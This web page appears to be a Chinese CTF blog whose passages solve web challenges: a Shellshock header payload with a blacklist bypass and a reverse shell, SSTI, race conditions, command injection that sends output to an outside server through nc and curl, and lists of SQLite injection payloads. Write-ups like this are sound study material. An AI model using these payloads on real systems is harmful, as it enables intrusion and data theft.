<p>审计index.php的时候，发现了一个黑名单，过滤了/flag以及(){ :; };，这个时候还并不知道有何作用，接着查看untar的源码，发现网页只是把我们上传的文件名进行解压，并没什么卵用。接下来的源码没啥利用价值。<br>根据飘零师傅的wp，飘零师傅通过观察到了env以及putenv联想到了之前的一个cve，具体的分析如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/articles/system/45390.html</span><br></pre></td></tr></table></figure></p>
<p>接着飘零师傅推荐这篇生成exp的文章:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/20/3.png" alt=""><br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; :; &#125;; echo Hacked&quot; -q -O -  http://127.0.0.1/shock.php</span><br></pre></td></tr></table></figure></p>
<p>接着可以对比一下之前的源码，发现出现漏洞的源码十分相似，我们可以尝试一下payload的实用性，不过之前在waf中我们看到过滤了payload的一部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
<p>我们可以通过在:;之间加空格来绕过，所以尝试的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo This is a test&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/20/4.png" alt=""><br>发现成功执行了命令，那接着我们可以尝试读取一下/etc/passwd<br><img src="/images/20/5.png" alt=""><br>可以发现flag文件夹在根目录下，尝试读取一下。<br><img src="/images/20/6.png" alt=""><br>突然想起来，/flag被过滤了，这里我们用通配符绕过，但是并没有任何回显，我们用第四个功能ls看啥情况。<br><img src="/images/20/7.png" alt=""><br>发现我们没权限读取这个文件，需要root权限，但是下面flag-reader.c可以读取，我们尝试读一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char buff[4096], rnd[16], val[16];</span><br><span class="line">	if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123;</span><br><span class="line">		write(1, &quot;Not enough random\n&quot;, 18);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(1337);</span><br><span class="line">	seteuid(1337);</span><br><span class="line">	alarm(1);</span><br><span class="line">	write(1, &amp;rnd, sizeof(rnd));</span><br><span class="line">	read(0, &amp;val, sizeof(val));</span><br><span class="line"></span><br><span class="line">	if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123;</span><br><span class="line">		int fd = open(argv[1], O_RDONLY);</span><br><span class="line">		if(fd &gt; 0) &#123;</span><br><span class="line">			int s = read(fd, buff, 1024);</span><br><span class="line">			if(s &gt; 0) &#123;</span><br><span class="line">				write(1, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			write(1, &quot;Can not open file\n&quot;, 18);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		write(1, &quot;Wrong response\n&quot;, 16);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>看不太懂，套用一叶飘零师傅的话就是，这个命令可以1秒之内把他输出的再输入回去，就可以打出文件内容。<br>运行这个c，再把这个c输出在1s内再输回去，但是纯靠这样的交互，速度极慢，所以容易想到，要不要拿个shell？接着我们可以利用bash弹shell到我们的服务器上:<br><img src="/images/20/8.png" alt=""><br>有了shell，现在就是如何读取flag的问题了，这里借鉴了一叶飘零师傅的思路，通过找到可写入文件的目录，利用了linux下的重定向，将输出写到某个文件中，再自动输入即可，这样即可达到目的。通过ls的功能我们可以看到tmp目录可以写入，所以参考的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/flllag &lt; /var/tmp/flllag</span><br></pre></td></tr></table></figure></p>
<p>接着读取这个文件就行了。<br>PS:记得删除自己所留下的文件，要不然可能导致题目没办法做了。不过在tmp目录下一堆别人留下的flag文件，随便读一个就行了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/01/结合CVE的一道命令执行弹shell的题目/" data-id="cjsk8gf1s00215cvjuz8x6mnq" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛学习总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/10/15/近期比赛学习总结/" class="article-date">
  <time class="post-time" datetime="2018-10-15T10:22:35.000Z" itemprop="datePublished">
    <span class="post-month">10月</span><br>
    <span class="post-day">15</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/15/近期比赛学习总结/">近期比赛学习总结</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>最近又陷入了自闭自闭又自闭的环节，先是pico高中生比赛被吊打，接着又是inctf被吊打，周末又被护网杯题目弄自闭，对此只能说自己技术太菜，总结一下最近新学到的知识点吧（由于比赛打完之后环境关了，所以只能结合大师傅们的wp进行复现）。  </p>
<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h2><p>这是护网杯的签到题，说句实话一开始打就知道这一次比赛又是凶多吉少，点进去发现有三个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p>
<p>赛后梳理起来，提示真是太明显了，当然这是马后炮了，render()就说明了这里用了渲染，就可能存在ssti注入，果不其然在报错页面发现了msg这个参数，通过利用msg=4测试发现返回了4，也就是说明可以通过ssti注入得到数据。<br>接着是url构成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=Orz.txt&amp;signature=9e3bb6483951e58b6095f949d572dd9a</span><br></pre></td></tr></table></figure></p>
<p>hint.txt提示签名的生成方式，以及flag.txt提示了/flllllllllllg也就是说我们只要读取这个文件夹就能得到flag，那现在问题就是通过ssti注入得到cookie_secret，通过测试发现了一个问题就是ssti注入过滤了很多东西，只能读取变量。<br>既然题目提示了easy tornado，那么我们可以查询源码找突破口，这部分直接搜索cookie发现了在handler.settings存放了cookie_secret，直接通过msg=读取出cookie_secret再通过hint中提示的签名方式生成/fllllllllg的签名读取出flag。<br>这道题目有两个点坑，导致我没做出来….一个就是报错界面了，之后一定要主要一些报错界面或者一些不太重要的界面，既然存在就有他的作用，接着第二个点就是没认真阅读tornado的源码，如果存在ssti注入那模板一定得认真阅读，特别是关于敏感信息的一些文件。  </p>
<h2 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h2><p>这是一道关于条件竞争以及整数溢出的题目，一开始只有20块只能买4个辣条，通过开多线程跑出来发现自己花了20元买了7个辣条，接着在兑换的时候利用整数溢出漏洞买足够辣条通过兑换flag得到flag。  </p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争漏洞是一种服务器端的漏洞，是由于开发者设计应用程序并发处理时操作逻辑不合理而造成。当应用面临高并发的请求时未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。<br>在CTF中很容易出现这种漏洞，特别是在文件操作以及金额同步的情形下，例如上面这道题目，在购买辣条时，后端操作应该是先把辣条数+1，然后再扣除费用，当我们开多线程发送多条购买辣条的请求时，服务端同时处理多条请求，同步处理不当，很有可能导致一包辣条的钱购买了多包的情况，或者是在金额即将归零时购买了辣条导致金额为负值。<br>或者是在上传文件时，服务器先将文件储存再通过检测后缀名将黑名单的文件进行删除，这里可以在文件删除之前访问文件，从而执行文件中的命令，例如可以在文件中写入file_put_contents()再生成一个shell，或者是将文件名改成白名单的文件。</p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>准确来说这并不是属于web方面的内容，但是web杂的很，结合啥的漏洞都可能出现，像之前接触到的sprintf()格式化漏洞，结合mysql就出了一道盲注题目，还有pwn方面的结合web就有了沙箱逃逸这个专题…..话不多说…<br>一般来说，整形变量有int，short，long等，但是很多程序员在使用typedef定义新整形变量时会随缘定义，这就导致一些程序在跨平台的兼容性很差，所以业界有了一个整形变量的标准。如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef signed char             int8_t;   </span><br><span class="line">typedef short int               int16_t;  </span><br><span class="line">typedef int                     int32_t;  </span><br><span class="line">typedef long int                int64_t;    </span><br><span class="line">typedef long long int           int64_t;  </span><br><span class="line">typedef unsigned char           uint8_t;  </span><br><span class="line">typedef unsigned short int      uint16_t;  </span><br><span class="line">typedef unsigned int            uint32_t;  </span><br><span class="line">typedef unsigned long int       uint64_t;  </span><br><span class="line">typedef unsigned long long int  uint64_t;</span><br></pre></td></tr></table></figure></p>
<p>而在c中，这些整数储存占用字节如下:<br><img src="/images/19/1.png" alt=""><br>溢出的方式根据数据类型有两种不同的类型：<br>第一种上界溢出，比如short int这个类型，它储存的数据从-32678~32677，如果我们操作32677，让其加1，那它储存的数据块最后一位储存符号位的字节就被溢出的数据给更改了，也就是说直接变为了最小的-32678，如果根据算式来看就是<strong>32677+1=-32678</strong>，这种带符号位在web网页中不常见，常见的是unsigned类型，再比如说unsigned short int数据储存的范围是0~65535，要是对65535操作加1，也就变成了0，通过算式说明就是:<strong>65535+1=0</strong>，也就是说我如果在网页中购买大量商品，后台数据处理出现整数溢出，那我们就能花1件的钱来购买65537件商品。<br>第二种为下界溢出，就类似上界溢出的逆运算，利用点和上界溢出一样，就粗略带过了…</p>
<h2 id="Fancy-alive-monitoring"><a href="#Fancy-alive-monitoring" class="headerlink" title="Fancy-alive-monitoring"></a>Fancy-alive-monitoring</h2><p>直接上源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Monitoring Tool&lt;/title&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">	function check()&#123;</span><br><span class="line">		ip = document.getElementById(&quot;ip&quot;).value;</span><br><span class="line">		chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br><span class="line">		if (!chk) &#123;</span><br><span class="line">			alert(&quot;Wrong IP format.&quot;);</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			document.getElementById(&quot;monitor&quot;).submit();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Monitoring Tool ver 0.1&lt;/h1&gt;</span><br><span class="line">	&lt;form id=&quot;monitor&quot; action=&quot;index.php&quot; method=&quot;post&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">	&lt;p&gt; Input IP address of the target host</span><br><span class="line">	&lt;input id=&quot;ip&quot; name=&quot;ip&quot; type=&quot;text&quot;&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;input type=&quot;button&quot; value=&quot;Go!&quot; onclick=&quot;check()&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$ip = $_POST[&quot;ip&quot;];</span><br><span class="line">if ($ip) &#123;</span><br><span class="line">	// super fancy regex check!</span><br><span class="line">	if (preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip)) &#123;</span><br><span class="line">		exec(&apos;ping -c 1 &apos;.$ip, $cmd_result);</span><br><span class="line">		foreach($cmd_result as $str)&#123;</span><br><span class="line">			if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;Wrong IP Format.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;a href=&quot;index.txt&quot;&gt;index.php source code&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>题目主要是考源码审计以及命令执行，题目在客户端和服务端分别对ip进行了检测，第一次在客户端的检测如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br></pre></td></tr></table></figure></p>
<p>这里明显只能匹配xxx.xxx.xxx.xxx格式的ip，但是可以很简单的通过burp抓包绕过，接着看服务端的检测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip</span><br></pre></td></tr></table></figure></p>
<p>这里并没有使用$限制输入ip的结束，也就是说我们只要满足前面的ip匹配即可，接着使用命令分隔符就能执行我们命令了，但是源码中并没有回显，只有这一部分回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br></pre></td></tr></table></figure></p>
<p>那也就是说，我们得通过其他方式来获取回显的信息。这里提供两种方式。</p>
<h3 id="netcat监听"><a href="#netcat监听" class="headerlink" title="netcat监听"></a>netcat监听</h3><p>第一种方式就是在我们的服务器上开启一个监听端口，然后在目标机上通过nc链接，把执行的命令返回给我们的服务器。<br>首先我们开启一个端口，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure></p>
<p>接着使用目标机执行ls命令然后发给我们的服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;ls | nc 66.42.72.66 2333</span><br></pre></td></tr></table></figure></p>
<p>我们的服务器就收到了回显：<br><img src="/images/19/2.png" alt=""><br>接着通过读取flag文件就好了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;cat the-secret-1755-flag.txt | nc 66.42.72.66 2333</span><br></pre></td></tr></table></figure></p>
<p>得到flag：picoCTF{n3v3r_trust_a_b0x_36d4a875}</p>
<h3 id="带flag访问接收器"><a href="#带flag访问接收器" class="headerlink" title="带flag访问接收器"></a>带flag访问接收器</h3><p>第二种方式是通过带flag直接访问我们的服务器，把执行命令返回的内容通过赋值到一个变量然后访问我们的服务器，例如使用curl 或者是 wget命令。例如我们可以构造这样一个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;curl http://66.42.72.66/`ls`</span><br></pre></td></tr></table></figure></p>
<p>接着我们查看日志，发现:<br><img src="/images/19/3.png" alt=""><br>我们只得到了一个文件，那就是index.php，结合使用netcat监听方法发现这是第一个文件，这是因为在/的后面只能带一个参数，所以在不清楚有多少文件的情况下，我们是没办法用倒叙或者一个一个查的，因此我们可以使用base64，把结果进行编码构成一个参数进行访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;curl http://66.42.72.66/`ls | base64`</span><br></pre></td></tr></table></figure></p>
<p>我们接收到了base64后的所有文件名:<br><img src="/images/19/4.png" alt=""><br>接着解码再读flag就行了。这也可以使用？带变量进行访问具体可以自己尝试。  </p>
<h2 id="A-Simple-Question"><a href="#A-Simple-Question" class="headerlink" title="A Simple Question"></a>A Simple Question</h2><p>这是一道考sqlite注入的题目，sql注入中这一种倒是不太常见，但是和mysql有着类似的特点。<br>一进去就发现源码泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>简单审计发现，数据库会查询我们输入的答案，如果返回结果，那么会输出you are so close，但是如果搜索无果，那么就只会提示wrong，题目的主要思路就是通过注入的方式判断answer是什么，再通过输入answer得到flag。</p>
<h3 id="sqlite注入"><a href="#sqlite注入" class="headerlink" title="sqlite注入"></a>sqlite注入</h3><p>sqlite注入和mysql注入差不多，就是语法存在一些差异。<br>这里以字符型为例子:  </p>
<ul>
<li>查询行数：’ order by x – -  </li>
<li>查询回显位： ‘ union select 1,2,3,4,5….. – -</li>
<li>查询表名： ‘ union select 1,group_concat(tbl_name),3,4,5… from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ – -</li>
<li>查询列名： ‘ union select 1,group_concat(sql),3,4,5… from sqlite_master where type!=’meta’ and sql not null and name not like ‘sqlite_%’ and table=’表名’ – -</li>
<li>查询字符串： ‘ union select 1,列名,3,4,5… from 表名 – -</li>
</ul>
<p>接下来就是sqlite的布尔型注入:</p>
<ul>
<li>查询表的数量：’ and ( (select count(tbl_name) from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ ) = x) – -</li>
<li>查询表名长度： ‘ and ((select length(tbl_name) from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ limit 0 offset 1) = x) – -</li>
<li>查询表名：’ and ( (SELECT hex(substr(tbl_name,’猜解的字符位置’,1)) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 0) = hex(‘a’) ) – -</li>
<li>查询列名： ‘ and ((select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,’(‘)%2b1)),instr((substr(sql,instr(sql,’(‘)%2b1)),’<code>&#39;)),&quot;TEXT&quot;,&#39;&#39;),&quot;INTEGER&quot;,&#39;&#39;),&quot;AUTOINCREMENT&quot;,&#39;&#39;),&quot;PRIMARY KEY&quot;,&#39;&#39;),&quot;UNIQUE&quot;,&#39;&#39;),&quot;NUMERIC&quot;,&#39;&#39;),&quot;REAL&quot;,&#39;&#39;),&quot;BLOB&quot;,&#39;&#39;),&quot;NOT NULL&quot;,&#39;&#39;),&quot;,&quot;,&#39;~~&#39;),&quot;</code>“,””),’猜解的字符位置’,1)) FROM sqlite_master WHERE type!=’meta’ AND sql NOT NULL AND name NOT LIKE ‘sqlite_%’ and name=’表名’) = hex(‘a’) ) – -</li>
<li>查询字符串： ‘ and ( (select hex(substr(列名),1,1)) from users limit 1 offset 0) = hex(‘a’) ) – -</li>
</ul>
<p>这些操作也不用死记住，理解查询的语法就差不多了，复杂的到时写脚本直接套就行了。</p>
<p>参考链接：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof/" target="_blank" rel="noopener">整数溢出原理介绍</a><br><a href="https://blog.csdn.net/Mary19920410/article/details/71518130?locationNum=4&amp;fps=1" target="_blank" rel="noopener">浅析C语言之uint8_t / uint16_t / uint32_t /uint64_t</a><br><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">2018护网杯-web-writeup</a><br><a href="https://blog.csdn.net/qq_32400847/article/details/58756980" target="_blank" rel="noopener"><br>基于SQLite数据库的Web应用程序注入指南</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjsk8gf3i002o5cvjgqrqjjcw" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于命令执行的学习" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/10/08/关于命令执行的学习/" class="article-date">
  <time class="post-time" datetime="2018-10-08T11:33:09.000Z" itemprop="datePublished">
    <span class="post-month">10月</span><br>
    <span class="post-day">08</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/08/关于命令执行的学习/">关于命令执行的初步学习</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:<br>wget:在后面接上下载文件的地址，可以将文件下载下来。-C参数可以将文件保存为你所要的文件名。这个命令一般用来下载shell，在无法写入shell的时候可以尝试。<br>>:定向输出到文件，如果文件不存在，就创建文件；如果文件存在，就将其清空。这个一般用法是通过  echo “内容” &gt;文件名  的格式来将内容写入文件里面，一般是用来写入shell。<br>;:命令分隔符<br>…….<br>其他的命令自行查阅<a href="http://www.cnblogs.com/yjd_hycf_space/p/7730690.html" target="_blank" rel="noopener">Linux常用命令大全</a></p>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>一般来说，我们通过网页输入的命令会经过php代码的过滤以及转义处理才进而在服务器中执行，很多过滤操作也是由php代码来完成，所以很多绕过方式也是基于php环境的(例如上一篇的过滤绕过方式)。</p>
